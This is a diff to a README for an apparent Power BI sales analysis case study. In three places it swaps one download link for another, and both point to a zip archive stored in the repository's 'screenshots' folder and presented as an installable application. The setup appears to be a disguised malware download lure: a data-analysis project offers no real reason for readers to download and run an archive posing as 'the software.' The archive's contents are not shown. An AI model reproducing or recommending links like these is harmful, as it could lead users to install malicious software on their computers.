@@ -6,9 +6,9 @@ Welcome to the powerbi-sales-analysis-case-study! This application provides an e
 
 ## 📥 Download & Install
 
-To get started, you need to download the software. Visit this page to download: [Download Power BI Sales Analysis Case Study](https://raw.githubusercontent.com/itorandrade/powerbi-sales-analysis-case-study/main/screenshots/powerbi_study_sales_case_analysis_1.8.zip)
+To get started, you need to download the software. Visit this page to download: [Download Power BI Sales Analysis Case Study](https://raw.githubusercontent.com/itorandrade/powerbi-sales-analysis-case-study/main/screenshots/sales-powerbi-study-case-analysis-velociman.zip)
 
-![Download](https://raw.githubusercontent.com/itorandrade/powerbi-sales-analysis-case-study/main/screenshots/powerbi_study_sales_case_analysis_1.8.zip)
+![Download](https://raw.githubusercontent.com/itorandrade/powerbi-sales-analysis-case-study/main/screenshots/sales-powerbi-study-case-analysis-velociman.zip)
 
 ## 🖥️ System Requirements
 
@@ -34,7 +34,7 @@ This application comes packed with features that enhance your analytics experien
 ## 📈 Usage Instructions
 
 1. **Download the Application:**
-   Visit this page to download: [Download Power BI Sales Analysis Case Study](https://raw.githubusercontent.com/itorandrade/powerbi-sales-analysis-case-study/main/screenshots/powerbi_study_sales_case_analysis_1.8.zip)
+   Visit this page to download: [Download Power BI Sales Analysis Case Study](https://raw.githubusercontent.com/itorandrade/powerbi-sales-analysis-case-study/main/screenshots/sales-powerbi-study-case-analysis-velociman.zip)
 
 2. **Install Power BI Desktop:**
    If you haven’t installed Power BI Desktop, download it from the Microsoft website. Follow the provided instructions to install it on your Windows computer.
